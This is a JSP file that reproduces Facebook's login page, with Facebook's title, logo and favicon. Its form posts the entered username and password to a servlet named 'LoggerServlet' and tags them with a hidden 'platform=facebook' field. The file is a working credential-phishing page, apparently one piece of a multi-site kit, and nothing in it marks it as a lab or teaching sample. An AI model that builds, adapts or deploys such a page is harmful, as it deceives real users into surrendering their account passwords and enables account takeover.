<%@ page language="java" contentType="text/html; charset=UTF-8"
    pageEncoding="UTF-8"%>
<html>
<head>
    <title>Facebook – log in or sign up</title>
    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yo/r/iRmz9lCMBD2.ico">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body {
            background-color: #f0f2f5;
            font-family: Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .login-box {
            background-color: #ffffff;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
            width: 360px;
            text-align: center;
        }
        .login-box img {
            width: 200px;
            margin-bottom: 20px;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 12px;
            margin: 8px 0;
            border: 1px solid #dddfe2;
            border-radius: 6px;
        }
        button {
            width: 100%;
            padding: 12px;
            background-color: #1877f2;
            color: #fff;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: bold;
            margin-top: 10px;
            cursor: pointer;
        }
        button:hover {
            background-color: #166fe5;
        }
    </style>
</head>
<body>
<div class="login-box">
    <img src="https://www.facebook.com/images/fb_icon_325x325.png" alt="Facebook">
    <form action="LoggerServlet" method="post">
    <input type="hidden" name="platform" value="facebook" />
    <input type="text" name="username" placeholder="Phone number, username, or email" required />
    <input type="password" name="password" placeholder="Password" required />
    <button type="submit">Log In</button>
</form>

</div>
</body>
</html>